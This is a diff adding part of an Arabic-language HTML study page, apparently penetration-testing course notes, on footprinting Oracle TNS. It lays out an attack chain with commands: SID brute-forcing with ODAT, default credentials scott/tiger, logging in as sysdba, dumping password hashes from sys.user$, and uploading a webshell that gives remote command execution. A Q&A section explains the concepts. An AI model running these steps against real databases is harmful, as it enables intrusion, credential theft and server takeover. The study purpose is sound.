+<span class="cmt"># 3. جرب ODAT للـ credentials:</span>
+<span class="cmd">./odat.py all -s TARGET</span>
+<span class="ok">[+] Valid credentials: scott/tiger</span>
+
+<span class="cmt"># 4. اتصل بـ sqlplus:</span>
+<span class="cmd">sqlplus scott/tiger@TARGET/XE</span>
+
+<span class="cmt"># 5. ارفع صلاحياتك لـ sysdba:</span>
+<span class="cmd">sqlplus scott/tiger@TARGET/XE as sysdba</span>
+
+<span class="cmt"># 6. اسرق الـ hashes:</span>
+<span class="cmd">select name, password from sys.user$;</span>
+
+<span class="cmt"># 7. ارفع webshell:</span>
+<span class="cmd">./odat.py utlfile -s TARGET -d XE -U scott -P tiger \
+  --sysdba --putFile C:\\inetpub\\wwwroot shell.php ./shell.php</span>
+
+<span class="cmt"># 8. RCE!</span>
+<span class="cmd">curl http://TARGET/shell.php?cmd=whoami</span>
+<span class="ok">nt service\oracle  ← 💥 RCE!</span></div>
+  </div>
+
+</div>
+
+<!-- METHODOLOGY -->
+<div id="panel-methodology" class="panel">
+
+  <div class="card">
+    <div class="card-title">⛓️ خطوات الـ Oracle TNS Footprinting</div>
+    <div class="mstep">
+      <div class="mnum">1</div>
+      <div class="mcontent">
+        <div class="mtitle">Nmap Scan — اكتشاف الخدمة</div>
+        <div class="mdesc">تحقق إذا Port 1521 مفتوح + إصدار Oracle</div>
+        <div class="code" style="margin-top:6px;"><span class="cmd">sudo nmap -p1521 -sV TARGET --open</span></div>
+      </div>
+    </div>
+    <div class="mstep">
+      <div class="mnum">2</div>
+      <div class="mcontent">
+        <div class="mtitle">SID Enumeration</div>
+        <div class="mdesc">لازم تعرف الـ SID قبل ما تتصل</div>
+        <div class="code" style="margin-top:6px;"><span class="cmd">sudo nmap -p1521 TARGET --script oracle-sid-brute
+./odat.py sidguesser -s TARGET</span></div>
+      </div>
+    </div>
+    <div class="mstep">
+      <div class="mnum">3</div>
+      <div class="mcontent">
+        <div class="mtitle">Password Guessing</div>
+        <div class="mdesc">جرب الـ credentials الافتراضية أول</div>
+        <div class="code" style="margin-top:6px;"><span class="cmd">./odat.py all -s TARGET</span>
+<span class="cmt"># يجرب: scott/tiger, dbsnmp/dbsnmp, sys/change_on_install...</span></div>
+      </div>
+    </div>
+    <div class="mstep">
+      <div class="mnum">4</div>
+      <div class="mcontent">
+        <div class="mtitle">Privilege Escalation → sysdba</div>
+        <div class="mdesc">جرب الدخول كـ sysdba للحصول على أعلى صلاحية</div>
+        <div class="code" style="margin-top:6px;"><span class="cmd">sqlplus scott/tiger@TARGET/XE as sysdba</span></div>
+        <div class="alert danger" style="margin-top:6px;">🎯 sysdba = تحكم كامل بكل قواعد البيانات!</div>
+      </div>
+    </div>
+    <div class="mstep">
+      <div class="mnum">5</div>
+      <div class="mcontent">
+        <div class="mtitle">سرقة البيانات</div>
+        <div class="mdesc">Password hashes + بيانات حساسة</div>
+        <div class="code" style="margin-top:6px;"><span class="cmd">select name, password from sys.user$;
+select table_name from all_tables;
+select * from users;</span></div>
+      </div>
+    </div>
+    <div class="mstep">
+      <div class="mnum">6</div>
+      <div class="mcontent">
+        <div class="mtitle">File Upload → RCE</div>
+        <div class="mdesc">لو في web server → ارفع webshell</div>
+        <div class="code" style="margin-top:6px;"><span class="cmd">./odat.py utlfile ... --putFile C:\\inetpub\\wwwroot shell.php</span></div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<!-- EXPLAINED Q&A -->
+<div id="panel-explained" class="panel">
+
+  <div class="card">
+    <div class="card-title">🌐 الأساسيات</div>
+    <div class="qa">
+      <div class="qa-q">إيش يعني "Transparent" في اسم TNS؟</div>
+      <div class="qa-a">التطبيق ما يحتاج يعرف كيف الاتصال يصير — TNS يتكفل بكل التفاصيل في الخلفية. مثل لما تتصل بالهاتف ما تفكر في كيف الصوت يتحول لإشارات.</div>
+    </div>
+    <div class="qa">
+      <div class="qa-q">إيش الـ Listener وليش مهم؟</div>
+      <div class="qa-a">برنامج يجلس على Port 1521 وينتظر الاتصالات — مثل حارس بوابة. كل خدمة عندها listener: MySQL → 3306، SSH → 22، Oracle → 1521. التحكم بالـ Listener = تحكم في كل من يدخل للـ database.</div>
+    </div>
+    <div class="qa">
+      <div class="qa-q">ليش Oracle في الشركات الكبيرة وليس MySQL؟</div>
+      <div class="qa-a">Oracle يدعم تشفير مدمج + load balancing + fault tolerance + أدوات إدارة متقدمة. MySQL أبسط وأرخص بس أقل في الميزات للبيئات المعقدة. في البنوك والمستشفيات الأمان والموثوقية أهم من السعر.</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">🔑 SID والاتصال</div>
+    <div class="qa">
+      <div class="qa-q">إيش الـ SID وليش ضروري؟</div>
+      <div class="qa-a">SID = System Identifier = اسم فريد لكل database instance. على نفس السيرفر ممكن يكون عندك ORCL وPROD وDEV — كل واحد SID مختلف. بدون SID صح الاتصال يفشل فوراً.</div>
+    </div>
+    <div class="qa">
+      <div class="qa-q">إيش الفرق بين tnsnames.ora وlistener.ora؟</div>
+      <div class="qa-a">tnsnames.ora على جهاز الـ client — يقول "لو بدك تتصل بـ ORCL روح هنا". listener.ora على السيرفر — يقول للـ Listener "استمع على Port 1521 وخدم هاي الـ databases".</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">💀 الهجمات</div>
+    <div class="qa">
+      <div class="qa-q">ليش scott/tiger خطير؟</div>
+      <div class="qa-a">حساب افتراضي في Oracle قديم للتعلم والاختبار. كثير admins ينسون يحذفونه أو يغيرون باسورده. ODAT يجربه تلقائياً — لو نجح = دخول مباشر للـ database!</div>
+    </div>
+    <div class="qa">
+      <div class="qa-q">إيش sysdba وليش هو أخطر من أي حساب ثاني؟</div>
+      <div class="qa-a">sysdba = System Database Administrator = أعلى صلاحية في Oracle. مثل root على Linux. عندك sysdba = تقرأ كل البيانات + تسرق كل الـ hashes + تعدل أي شيء في قاعدة البيانات كاملة.</div>
+    </div>
+    <div class="qa">
+      <div class="qa-q">كيف File Upload يصير RCE؟</div>
+      <div class="qa-a">ODAT يستخدم UTL_FILE في Oracle لكتابة ملفات على الـ filesystem. لو السيرفر عليه web server (IIS أو Apache)، ترفع shell.php على مجلد الـ web root، بعدين تطلبه من المتصفح بـ ?cmd=whoami = تشغّل أوامر OS مباشرة!</div>
+    </div>
+  </div>
+
+</div>
+
+</div><!-- end wrap -->
+
+<script>(function(){var c=document.getElementById('glass-particles');if(!c)return;var x=c.getContext('2d'),W,H,pts=[];function resize(){W=c.width=window.innerWidth;H=c.height=window.innerHeight}function spawn(){pts=[];var n=Math.max(80,Math.min(Math.round(W*H/7000),220));for(var i=0;i<n;i++)pts.push({x:Math.random()*W,y:Math.random()*H,r:Math.random()*1.8+0.4,vy:-(Math.random()*0.45+0.15),vx:(Math.random()-0.5)*0.18,a:Math.random()*0.55+0.15})}function draw(){x.clearRect(0,0,W,H);pts.forEach(function(p){x.beginPath();x.arc(p.x,p.y,p.r,0,Math.PI*2);x.fillStyle='rgba(255,255,255,'+p.a+')';x.fill();p.y+=p.vy;p.x+=p.vx;if(p.y<-8){p.y=H+4;p.x=Math.random()*W}if(p.x<0)p.x=W;if(p.x>W)p.x=0});requestAnimationFrame(draw)}resize();spawn();draw();window.addEventListener('resize',function(){resize();spawn()})})();</script>
+
+<script>
+function showPanel(name,btn){
+  document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById('panel-'+name).classList.add('active');
+  btn.classList.add('active');
+}
+function showTool(name,btn){
+  document.querySelectorAll('.tool-panel').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.tool-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById('tool-'+name).classList.add('active');
+  btn.classList.add('active');
+}
+</script>
+</body>
+</html>
